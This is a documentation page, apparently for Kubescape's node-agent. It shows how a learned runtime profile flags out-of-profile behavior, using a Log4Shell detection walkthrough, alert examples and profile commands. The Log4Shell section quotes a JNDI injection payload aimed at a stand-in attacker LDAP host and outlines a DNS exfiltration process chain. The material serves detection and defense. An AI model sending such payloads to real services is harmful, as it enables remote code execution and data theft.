# End-to-end example

This page walks through the full lifecycle of a Bill of Behavior — deploy a workload, let Kubescape learn its profile, trigger an out-of-profile behavior, see the alert — and then covers the day-to-day commands for working with profiles. The walkthrough mirrors the node-agent component test `Test_01_BasicAlertTest`, so every step is something the project exercises in CI.

The worked example is a Log4Shell (CVE-2021-44228) scenario: a small `frontend → backend → postgres` chain where the backend runs a vulnerable `log4j`. It shows how a Bill of Behavior tells a contained exploit apart from a successful one.

!!! note "What you need"
    - A Kubernetes cluster with Kubescape installed and the node-agent enabled (see [Install in your cluster](../../install-operator.md)).
    - `kubectl` configured against that cluster.
    - About 10 minutes (most of it waiting for the learning period).

## 1. Deploy a workload

```bash
kubectl create namespace bob-demo
kubectl apply -n bob-demo -f https://raw.githubusercontent.com/kubescape/node-agent/main/tests/resources/nginx-deployment.yaml
```

The node-agent detects the new workload and begins its learning period.

## 2. Watch the profile being learned

During the learning period the node-agent records every process, file open, network connection, and capability the workload uses, writing them to an `ApplicationProfile`:

```bash
kubectl get applicationprofiles -n bob-demo -w
```

The profile moves from `initializing` → `ready` → `completed` when the learning period ends:

```
NAME                       COMPLETION   STATUS
replicaset-nginx-7d8b...   complete     completed
```

Inspect what was learned — the executables it ran, the files it opened with their flags, and (in the paired `NetworkNeighborhood`) the addresses it reached:

```bash
kubectl get applicationprofile -n bob-demo <name> -o yaml
kubectl get networkneighborhood -n bob-demo <name> -o yaml
```

## 3. Trigger an out-of-profile behavior

The learning period captured normal behavior. Now do something the workload never did — exec a shell into the pod, the runtime equivalent of a Log4Shell payload spawning `/bin/sh`:

```bash
kubectl exec -n bob-demo deploy/nginx -- ls -l /
```

## 4. See the alert

The node-agent compares the live `execve` against the sealed profile, finds no match, and raises an alert:

```bash
kubectl logs -n kubescape -l app=node-agent --tail=50 | grep -i "Unexpected process"
```

```
{"level":"warning","rule":"Unexpected process launched","process":"ls",
 "namespace":"bob-demo","pod":"nginx-...","message":"R0001 ..."}
```

That is a Bill of Behavior doing its job: the workload deviated from its declared behavior, and Kubescape said so.

## Why the profile matters — the Log4Shell scenarios

The same payload (`${jndi:ldap://attacker/Payload}` in a request header) produces three different runtime stories depending on the backend. A learned Bill of Behavior tells them apart by which signals fall outside the profile:

| Scenario | Backend image | What falls out of profile | Verdict |
|---|---|---|---|
| **A** | ubuntu base, vulnerable log4j | `execve(/bin/sh)` succeeds, outbound LDAP, high-entropy DNS exfil | full chain |
| **B** | distroless + hardened, vulnerable log4j | `execve` returns `ENOENT` under the java process — no shell to spawn | RCE contained |
| **C** | patched log4j 2.17.1 | JNDI string seen, but no LDAP, no exec — library ignored it | no foothold |

The discriminating signal between **A** and **B** is a single observation: whether the shell `execve` *succeeded* or failed with `ENOENT`. The Bill of Behavior makes that an alertable fact.

### Scenario A, captured

Running scenario A against a *supplied* Bill of Behavior — the backend profile permits only `java` — Kubescape flags every process the exploit spawns, each with its parent process attached, so the chain reads top to bottom:

![Kubescape flagging the Log4Shell RCE chain against the backend's Bill of Behavior](l4j-detection.gif)

| Rule | Process | Parent | What it means |
|---|---|---|---|
| `R0001` | `sh` | `pool-2-thread-2` (a JVM worker thread) | the RCE moment — a web-server thread never `execve`s a shell |
| `R0001` | `base32`, `tr`, `cut`, `getent` | `sh` | the encode-and-DNS-exfiltrate pipeline |
| — | `psql` | `sh` | **no alert** — `psql` is in the profile (the app really does query the DB); the attacker abused a permitted tool |

The single line that proves the compromise is `sh` with parent `pool-2-thread-2`. You detect Log4Shell here not by recognizing the CVE, but because the application did something its Bill of Behavior declares it never does.

## Day-to-day commands

**Retrieve profiles** (namespaced, one per workload):

```bash
kubectl get applicationprofiles -n <namespace>
kubectl get networkneighborhoods -n <namespace>
kubectl get applicationprofile -n <namespace> <name> -o yaml
```

**Check status** without dumping the whole object:

```bash
kubectl get applicationprofile -n <namespace> <name> \
  -o jsonpath='{.metadata.annotations.kubescape\.io/status}'
```

| Status | Meaning |
|---|---|
| `initializing` | workload just detected; learning began |
| `ready` | enough learned to begin matching |
| `completed` | learning period ended; profile sealed |

**Tune the learning period.** The default is 5 minutes; for testing, shorten it on the node-agent (Helm value `nodeAgent.config.learningPeriod`). The component tests use a short period so a profile completes in under two minutes.

**Read alerts.** Each alert carries the rule that fired (e.g. `R0001` for an unexpected process), the offending observation, and the workload:

```bash
kubectl logs -n kubescape -l app=node-agent --tail=100
```

**Clean up:**

```bash
kubectl delete namespace bob-demo
```

## Authoring a production profile with wildcards

A learned profile describes one observed instance. For a profile you *ship* rather than learn, use wildcards so it describes a class of behavior, then sign it. For example, allow the backend to reach any Stripe API host but nothing else:

```yaml
egress:
- identifier: stripe-api
  dnsNames:
    - "*.api.stripe.com."     # leading * — exactly one label (RFC 4592)
  ipAddresses:
    - "162.0.0.0/16"          # CIDR
  ports:
    - {name: TCP-443, protocol: TCP, port: 443}
```

Apply it like any custom resource:

```bash
kubectl apply -f my-profile.yaml
```

A user-supplied profile can be **signed** so any later modification is detected at runtime, and **compacted** with a `CollapseConfig` to keep it small. See the [overview](index.md#beyond-learned-profiles) for where these fit.
